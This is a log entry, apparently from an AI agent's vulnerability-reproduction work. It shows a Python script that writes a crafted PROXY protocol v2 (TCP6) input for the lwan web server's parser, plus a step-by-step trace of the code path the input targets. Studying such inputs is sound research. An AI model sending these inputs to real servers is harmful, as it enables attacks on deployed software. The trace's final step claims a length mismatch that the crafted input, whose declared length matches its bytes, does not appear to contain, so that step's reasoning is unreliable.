message:
Command `python3 - <<'PY'
from pathlib import Path
# Construct a candidate emphasizing TCP6 and a large but accepted size boundary.
sig = bytes.fromhex('0d0a0d0a000d0a515549540a')
# TCP6 address block is 36 bytes after the 4-byte header fields.
ln = 36
hdr = sig + bytes([0x21, 0x21]) + ln.to_bytes(2, 'big')
addr = bytes.fromhex('20010db8000000000000000000000001') + bytes.fromhex('20010db8000000000000000000000002') + bytes.fromhex('1f901f90')
http = b'GET / HTTP/1.1\r\nHost: x\r\n\r\n'
p = Path('/workspace/poc_tcp6.bin')
p.write_bytes(hdr + addr + http)
trace = [
  {"step":1,"file":"src/lib/lwan-request.c","function":"fuzz_parse_http_request","line":1624,"var":"request.flags","code":".flags = REQUEST_ALLOW_PROXY_REQS","note":"The harness always enables PROXY parsing, so any input starting with a valid signature reaches the proxy parser."},
  {"step":2,"file":"src/lib/lwan-request.c","function":"read_request_finalizer","line":888,"var":"helper->buffer->len","code":"char *crlfcrlf = memmem(helper->buffer->value, helper->buffer->len, \"\\r\\n\\r\\n\", 4);","note":"The harness only finalizes inputs containing an HTTP terminator, so the candidate includes a full request after the PROXY header."},
  {"step":3,"file":"src/lib/lwan-request.c","function":"parse_http_request","line":1170,"var":"request->flags","code":"if (request->flags & REQUEST_ALLOW_PROXY_REQS) { buffer = parse_proxy_protocol(request, buffer); }","note":"The first bytes are parsed as a PROXY frame before HTTP parsing begins."},
  {"step":4,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":223,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The attacker controls the PROXY v2 header fields, including the family and declared length."},
  {"step":5,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":236,"var":"hdr->fam","code":"if (LIKELY(hdr->cmd_ver == PROXY)) { if (hdr->fam == TCP4) ... else if (hdr->fam == TCP6) ... }","note":"Selecting TCP6 forces the parser through the larger address-copying branch and exercises the code handling the longest PROXY v2 address payload."},
  {"step":6,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":254,"var":"buffer","code":"buffer += size;","note":"After accepting the frame, the parser advances by the attacker-chosen length, moving the HTTP parser to the crafted tail bytes."},
  {"step":7,"file":"src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":266,"var":"helper->crlfcrlf","code":"helper->crlfcrlf = memmem(buffer, adjusted_size, \"\\r\\n\\r\\n\", 4);","note":"The adjusted scan over the remaining region can step beyond the intended request contents when the declared length and actual bytes disagree."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, indent=2))
print('/workspace/poc_tcp6.bin')
PY` executed with exit code 0.
